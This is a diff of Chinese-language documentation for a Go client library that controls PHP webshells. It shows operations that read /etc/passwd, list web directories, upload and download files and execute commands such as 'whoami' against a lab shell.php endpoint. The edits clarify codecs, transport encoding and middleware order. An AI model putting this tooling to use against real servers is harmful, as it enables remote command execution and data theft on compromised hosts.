@@ -48,7 +48,7 @@ client := core.NewClient(
         Metadata: map[string]string{"auth_password_field": "antpwd"},
     }),
     core.WithTransport(httpform.New("https://lab.example/shell.php")),
-    core.WithCodec(base64.New()),
+    // PHP eval 端默认使用 plain codec；只有远端明确支持对应协议时才启用其他 Codec。
     core.WithEnvelope(marker.New()),
     core.WithMiddleware(logging.Middleware()),
     core.WithTransforms(noop.New()),
@@ -73,6 +73,7 @@ res, err := client.Do(ctx, operation)
 phpshell.NewPhpInfo()                      // 系统信息
 phpshell.NewPhpFileList("/var/www")        // 列目录
 phpshell.NewPhpFileRead("/etc/passwd")     // 读文件
+phpshell.NewPhpFileDownload("/tmp/data.bin") // 下载二进制文件
 phpshell.NewPhpFileUpload("/tmp/x.go", data) // 上传文件
 phpshell.NewPhpExec("whoami")              // 执行命令
 ```
@@ -102,7 +103,7 @@ ops.NewFileDownload("/path")
 ```
 
 > ⚠️ 通用 ops 的 `Build` 只生成字面 payload，对 PHP Shell 没用。
-> PHP 环境必须用 `phpshell.NewPhp*()` 版本，否则远端拿不到可执行的 PHP 源码。
+> PHP 环境应使用 `phpshell.NewPhp*()`；也可以显式调用 `phpshell.NewClientFactory().WrapOp(op)` 转换受支持的通用 Info/List/Read/Download/Exec。`WrapOp` 不会被 Client 自动调用，通用 Upload 也不会隐式消费 reader。
 
 ### 自定义 Operation
 
@@ -117,7 +118,7 @@ func (o *MyOp) Parse(ctx context.Context, resp *core.Response) (core.Result, err
 
 ## 4. Transport
 
-只负责发送/接收，不理解业务。
+只负责发送/接收，不理解业务。`Request.Params` 会作为表单字段原样提交；PHP 模板需要的 Base64 等编码由 PHP Operation 在 Build 阶段完成。响应 body 超过 64MiB 时返回 `ErrProtocol`，不会静默截断。
 
 ```go
 // httpform（真实环境）
@@ -158,7 +159,7 @@ core.WithEnvelope(marker.NewWithLength(32))
 
 ## 7. Middleware
 
-按注册顺序包裹请求链：
+按注册顺序包裹请求链。Middleware 包裹 Transport、HTTP 状态映射、响应 Transform、Envelope、Codec 和 Operation.Parse，因此 logging/audit/retry 能观察最终响应错误；Operation.Build 和请求编码仍发生在链外。
 
 ```go
 core.WithMiddleware(
@@ -279,7 +280,7 @@ mgr.DoEach(ctx, filter, func(rec *NodeRecord) Operation {
 // 内存注册表
 reg := memory.New()
 
-// JSON 文件持久化
+// JSON 数组文件持久化；内置 Registry 会深复制 NodeRecord 的 map/slice
 reg, err := file.New("./nodes.json")
 
 // 接口
